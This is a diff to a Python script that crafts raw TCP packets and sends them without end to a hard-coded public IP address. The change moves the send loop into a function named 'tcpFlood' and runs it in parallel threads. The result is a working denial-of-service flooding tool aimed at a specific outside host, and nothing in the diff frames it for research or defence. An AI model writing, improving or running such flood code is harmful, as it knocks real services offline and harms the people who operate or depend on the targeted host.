@@ -2,6 +2,7 @@ import array
 import socket
 import struct
 import random
+import threading
 
 def chksum(packet: bytes) -> int:
     if len(packet) % 2 != 0:
@@ -60,8 +61,7 @@ class TCPPacket:
 
         return packet
 
-
-if __name__ == '__main__':
+def tcpFlood():
     dst = '185.43.206.93'
 
     while True:
@@ -75,3 +75,10 @@ if __name__ == '__main__':
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         for i in range(3):
             s.sendto(pak.build(), (dst, 0))
+
+if __name__ == '__main__':
+    for i in range(2):
+        print("Thread ", i, "Started")
+        t = threading.Thread(target=tcpFlood)
+        t.start()
+    
